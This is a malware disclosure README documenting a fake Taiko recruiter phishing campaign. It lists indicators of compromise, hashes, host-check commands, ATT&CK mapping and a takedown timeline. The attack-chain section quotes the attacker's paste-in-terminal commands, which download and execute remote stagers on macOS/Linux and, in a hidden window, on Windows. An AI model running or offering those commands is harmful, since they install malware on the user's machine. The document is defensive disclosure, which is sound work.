# taikotalent.xyz — Fake-Recruiter Terminal Trojan (IoCs & Detection)

> **STATUS: TAKEN DOWN.** The malicious domain `taikotalent.xyz` was suspended by its registrar (`clientHold`) on **2026-10-10 at 02:39 UTC** — ~12 hours after our evidence-backed follow-up to AWS abuse with the payload still live. Verified 2026-10-15 via RDAP and DNS. Details in the timeline below.


> **UPDATE 2026-10-15 — PHISHING DOMAIN TAKEN DOWN.** `taikotalent.xyz` and `hr.taikotalent.xyz` now return **NXDOMAIN** (checked via DNS-over-HTTPS, 2026-10-15) — 10 days after the coordinated reports of Oct 5 (AWS case `179121234700301`, NameCheap ticket `NC-DFA-2100`, 13 notified channels). The payload URLs (`/verify_m`, `/verify_w`) no longer resolve.
>
> **PARTIALLY RESOLVED — the C2 layer is still live:** `api.gaganata.ink` (104.21.84.196 / 172.67.196.60) and `api.fallgganata.ink` still resolve behind Cloudflare and answer HTTP (404 on probe, 2026-10-15). Abuse reports for the `gaganata.ink` / `fallgganata.ink` domains remain pending with the registrar and Cloudflare (abuse form requires browser + Turnstile).
>
> **Status @ 2026-10-09 00:46 UTC (historical):** payload still live — `https://taikotalent.xyz/verify_m` → HTTP 200, 49,916 bytes, byte-identical to the Oct 5 sample, 4+ days after the AWS abuse report.

A targeted phishing campaign impersonating **Taiko** (the Ethereum rollup company — real domain `taiko.xyz`, **no affiliation** with `taikotalent.xyz`) sends fake "Engineering opening" recruiting emails to open-source developers, harvested from their public GitHub profiles. The fake "application portal" ends in an **"Anti-bot check with Terminal"** page that talks the victim into pasting a downloader command into their **own terminal** — no exploit needed, the user executes the malware themselves.

## Takedown timeline

| Date (UTC) | Event |
|---|---|
| 2026-10-05 | Campaign received; sample quarantined; full forensic report sent (AWS case `179121234700301`, Resend, Taiko) |
| 2026-10-09 | Disclosure expanded: this repo, gist, dev.to, GitLab snippet, Telegraph; 9 more notifications incl. NameCheap abuse (→ ticket `NC-DFA-2100`), Softshellweb (payload host), Cloudflare (C2), APWG, OpenPhish, oss-security, 3 media outlets. Payload still byte-identical & live |
| 2026-10-15 | **`taikotalent.xyz` / `hr.taikotalent.xyz` → NXDOMAIN.** Phishing infrastructure down 10 days after first report. C2 (`api.gaganata.ink`, `api.fallgganata.ink`) still resolving behind Cloudflare |

## Why this matters

- **The novel bit:** the terminal-as-CAPTCHA social-engineering pattern — a fake anti-bot check that makes *running the stager* the "verification" step.
- **The accountability bit:** reported through the correct channels on Oct 5 (AWS case number, Resend, Taiko) with a full forensic report; the trojan URL is still serving a byte-identical payload on Oct 9.
- **The trust bit:** SPF and DKIM both *pass* — authentication proves control of an 8-day-old domain, not reputation. Mail gateways treating DMARC pass as safety are exposed.
- **The forensics bit:** anti-forensic design — self-deleting stager, base64-embedded second stage at `/var/tmp/.kdm.*`, detached via perl double-fork, 60-retry cleanup loop.

## Indicators of Compromise

| Type | Value | Context |
|---|---|---|
| Domain | `taikotalent.xyz` | Registered 2026-09-27 (Namecheap), 8 days before the campaign |
| Sending subdomain | `hr.taikotalent.xyz` | DKIM d=; MX → AWS SES inbound gateway |
| Sender | `josephquintana@hr.taikotalent.xyz` | Fake identity "Joseph Quintana, Talent, Taiko" |
| Sending IP | `23.249.215.58` | `d215-58.smtp-out.sa-east-1.amazonses.com` (Amazon SES via Resend) |
| Portal | `https://taikotalent.xyz/` | "Private invitation" SPA, per-recipient Ref-codes (`Ref-oxqgd77kb9zw14`) |
| Exfiltration | `POST /track-activity` | Device fingerprint + name/email/GitHub username at every form step |
| Payload (macOS/Linux) | `https://taikotalent.xyz/verify_m` | 49,916 B bash stager "deepfake_guard" — **LIVE 2026-10-09** |
| Payload (Windows) | `https://taikotalent.xyz/verify_w` | `v.cmd` launcher, hidden window |
| C2 | `https://api.gaganata.ink/guard-launcher-result` | Install-status beacon (Namecheap, Cloudflare-fronted) |
| C2 backup | `https://api.fallgganata.ink` | Secondary endpoint |
| Payload host IP | `193.160.32.10` | Shock Hosting (US-SHOCK1-20191118) |
| Second stage | `/var/tmp/.kdm.XXXXXX` | Base64-decoded embedded stage; anti-forensic self-delete |

## Key SHA-256 hashes

| Artifact | SHA-256 |
|---|---|
| `verify_m` quarantined 2026-10-05 (49,916 B) | `c7c22e322c17bda8198257342d4034af6250a5c433242461b870879ba9aa285d` |
| `verify_m` re-fetched LIVE 2026-10-09 | `c7c22e322c17bda8198257342d4034af6250a5c433242461b870879ba9aa285d` (byte-identical) |
| Original phishing email (raw) | `84d94746ea1e4642e00bbd6250f8e4fabfeff66b76acd040bb2219412195d564` |
| Original `.eml` attachment (11,098 B) | `3a5bb258d76a048d0c3ff8c3671410998ef548968e1ea674b5a9dd367fa3bcf3` |
| Forensic report PDF (17 pages, 201,044 B) | `d83bc2d16a1b91e839d8d9ec440b79fe09e73c92bd2a151b843c0182cd604a1c` |

## Verify it yourself (non-destructive)

```bash
curl -ks https://taikotalent.xyz/verify_m | sha256sum
# -> c7c22e322c17bda8198257342d4034af6250a5c433242461b870879ba9aa285d   (do NOT execute the download)
```

## Detection

**YARA** (see [`yara/bash_stager_taikotalent.yar`](yara/bash_stager_taikotalent.yar))

**Host compromise check (macOS/Linux):**

```bash
ls -la /var/tmp/.kdm.* 2>/dev/null
pgrep -fl 'verify_m|deepfake_guard|guard-launcher'
find ~ -maxdepth 2 \( -name 'verify_m' -o -name 'verify_w' -o -name 'v.cmd' \) 2>/dev/null
```

**Network:** block/monitor egress to `*.gaganata.ink`, `*.fallgganata.ink`, `taikotalent.xyz` (incl. `hr.` subdomain).

**Mail admins:** treat `SPF/DKIM pass` from recently-registered domains as neutral — authentication ≠ reputation.

## Attack chain

1. Targeted email to a public GitHub contributor offering a Taiko engineering role, from `josephquintana@hr.taikotalent.xyz` (DKIM s=resend d=hr.taikotalent.xyz, via Amazon SES sa-east-1, IP `23.249.215.58`).
2. "Private invitation" SPA portal with per-recipient Ref-codes; `POST /track-activity` exfiltrates device fingerprints at every step.
3. "Anti-bot check with Terminal" page instructs pasting a command into the victim's own terminal:
   - macOS/Linux: `perl -MPOSIX` double-fork daemonization + `curl -ks https://taikotalent.xyz/verify_m -o verify_m && exec bash verify_m`
   - Windows: `start -WindowStyle Hidden cmd '/c curl -ks https://taikotalent.xyz/verify_w -o v.cmd&&v.cmd'`
4. Stager `deepfake_guard`: relaunches detached via `nohup`, beacons to `api.gaganata.ink/guard-launcher-result` (fallback `api.fallgganata.ink`), decodes embedded base64 second stage to `/var/tmp/.kdm.XXXXXX`, executes it with C2 endpoints as env vars, then **self-deletes** launcher, status file and `/var/tmp` artifacts (60-retry anti-forensic loop).

## MITRE ATT&CK

| Technique | Name |
|---|---|
| T1566.002 | Spearphishing Link |
| T1656 | Impersonation |
| T1204.002 | User Execution: Malicious File (paste-in-terminal) |
| T1059.004 | Command & Scripting: Unix Shell |
| T1027 | Obfuscated Files (base64 second stage) |
| T1071.001 | Application Layer Protocol: Web (beacon) |
| T1070.004 | Indicator Removal: File Deletion (self-delete) |
| T1583.001 | Acquire Infrastructure: Domains |

## Timeline

| Date | Event |
|---|---|
| 2026-09-27 | `taikotalent.xyz` registered (Namecheap) |
| 2026-10-05 | Phishing email received; analysis + sample quarantined (never executed); AWS Trust & Safety, Resend and Taiko notified |
| 2026-10-06 | 17-page forensic report generated (hash `d83bc2d16a1b91e8…`) |
| 2026-10-07 | AWS routes the case to email-abuse@amazon.com |
| 2026-10-09 | Full public disclosure: [IoC gist](https://gist.github.com/eddyflores100-lang/198d8a13ba5901ea8ed7c63d5292c6ff) · [technical write-up](https://dev.to/edison_flores_6d2cd381b13/a-fake-recruiter-sent-me-a-job-offer-that-ended-in-my-terminal-the-trojan-is-still-live-2okf) · this repo; payload re-verified **live & byte-identical** |
| 2026-10-09 (later) | Follow-up re-sent to email-abuse@amazon.com with **live-payload** status; infrastructure mapped via RDAP: registrar **NameCheap**, payload host `193.160.32.10` (Softshell/SHOCK1 netblock, abuse contact softshellweb.com), C2 behind **Cloudflare**; abuse reports sent to all three providers + APWG, OpenPhish, oss-security + 3 media outlets (13 channels total) |
| 2026-10-10 02:39 UTC | **RESOLVED — registrar takedown.** RDAP now shows `clientHold` + `server transfer prohibited` on taikotalent.xyz, applied ~12 h after the live-payload follow-up. Domain lived 13 days (registered 2026-09-27, suspended 2026-10-10) |
| 2026-10-15 | Verified dead: `taikotalent.xyz`, `hr.` and `www.` return no DNS; payload `/verify_m` unreachable; C2 `api.gaganata.ink` still resolves behind Cloudflare but returns HTTP 404 — remnant only relevant to hosts already infected before the takedown |

## References

- Technical write-up (dev.to): https://dev.to/edison_flores_6d2cd381b13/a-fake-recruiter-sent-me-a-job-offer-that-ended-in-my-terminal-the-trojan-is-still-live-2okf
- IoC gist: https://gist.github.com/eddyflores100-lang/198d8a13ba5901ea8ed7c63d5292c6ff
- AWS abuse case: `P01M4696RCMDN90PYQGW7NJHGT0` / `179121234700301`
- Registrar takedown proof (RDAP 2026-10-15): clientHold applied 2026-10-10T02:39:30Z

## Credits & methodology

Analysis and disclosure by **Edison Flores** (AliceLabs). All evidence handled non-destructively: the payload was downloaded for hashing and never executed. The 17-page forensic report and the quarantined stager are available to defenders, registrars, hosters and journalists on request.
